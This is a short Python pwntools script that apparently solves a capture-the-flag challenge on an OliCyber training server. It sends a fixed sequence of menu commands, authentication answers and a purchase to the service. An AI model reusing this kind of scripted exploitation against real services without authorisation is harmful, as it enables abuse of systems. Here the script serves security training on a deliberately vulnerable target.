from pwn import remote

p = remote('the-cantina.challs.olicyber.it', 38083)

p.sendlineafter(b'> ',b'select_coin')
p.sendline(b'OLI')
p.sendlineafter(b'> ',b'select_wallet')
p.sendline(b'0xBABE')
p.sendlineafter(b'> ',b'authenticate')
p.recvline()
p.sendline(b'Han')
p.recvline()
p.sendline(b'Vader')
p.recvline()
p.sendline(b'Kashyyyk')
p.sendlineafter(b'> ',b'topup_wallet')
p.sendlineafter(b'> ',b'buy_drink')
p.sendline(b'Darksaber Distillate')

p.interactive()